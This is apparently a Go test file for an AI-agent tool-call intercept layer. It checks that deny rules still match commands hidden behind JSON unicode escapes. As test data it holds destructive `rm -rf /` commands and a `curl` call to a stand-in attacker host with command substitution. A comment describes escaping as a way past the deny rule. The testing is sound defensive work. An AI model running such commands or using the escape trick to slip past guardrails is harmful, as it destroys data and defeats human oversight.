package intercept

import (
	"regexp"
	"testing"

	"github.com/structuredstanza/AgentLab/m1nervac0nsole/db"
)

// A deny rule must see the arguments the tool will actually act on.
//
// The matcher used to test the encoded JSON envelope alone, so
// `{"command":"\u0072m -rf /"}` decoded to `rm -rf /` and ran while no rule
// matched. The escapes below are written out so this file stays ASCII; they
// decode to the same strings a model can emit.
func TestRuleMatchesDecodedToolInput(t *testing.T) {
	deny := func(matchType, pattern string) compiledRule {
		r := compiledRule{InterceptRule: db.InterceptRule{
			MatchTarget: "tool_input",
			MatchType:   matchType,
			Pattern:     pattern,
			Action:      "deny",
		}}
		if matchType == "regex" {
			r.re = regexp.MustCompile(pattern)
		}
		return r
	}

	t.Run("escaped command still matches a substring rule", func(t *testing.T) {
		input := []byte(`{"command":"\u0072m -rf /"}`)
		if !ruleMatches(deny("contains", "rm -rf"), "Bash", input) {
			t.Fatal("the escaped form decoded to `rm -rf /` but the deny rule did not match it")
		}
	})

	t.Run("escaped command still matches a regex rule", func(t *testing.T) {
		input := []byte(`{"command":"\u0063url http://evil.example/$(id)"}`)
		if !ruleMatches(deny("regex", `\$\(`), "Bash", input) {
			t.Fatal("the escaped form decoded to a command substitution but the regex rule did not match it")
		}
	})

	t.Run("a nested leaf is inspected", func(t *testing.T) {
		input := []byte(`{"entries":[{"value":"\u0072m -rf /"}]}`)
		if !ruleMatches(deny("contains", "rm -rf"), "Bash", input) {
			t.Fatal("a string nested inside an array was not inspected")
		}
	})

	t.Run("plain input still matches", func(t *testing.T) {
		if !ruleMatches(deny("contains", "rm -rf"), "Bash", []byte(`{"command":"rm -rf /"}`)) {
			t.Fatal("an unescaped deny pattern stopped matching")
		}
	})

	t.Run("no false positive on unrelated input", func(t *testing.T) {
		if ruleMatches(deny("contains", "rm -rf"), "Bash", []byte(`{"command":"ls -la"}`)) {
			t.Fatal("a benign command matched the deny rule")
		}
	})

	t.Run("tool name rules are unaffected", func(t *testing.T) {
		r := compiledRule{InterceptRule: db.InterceptRule{
			MatchTarget: "tool_name", MatchType: "contains", Pattern: "Bash", Action: "deny",
		}}
		if !ruleMatches(r, "Bash", []byte(`{}`)) {
			t.Fatal("a tool_name rule stopped matching its tool")
		}
		if ruleMatches(r, "WebFetch", []byte(`{}`)) {
			t.Fatal("a tool_name rule matched a different tool")
		}
	})
}
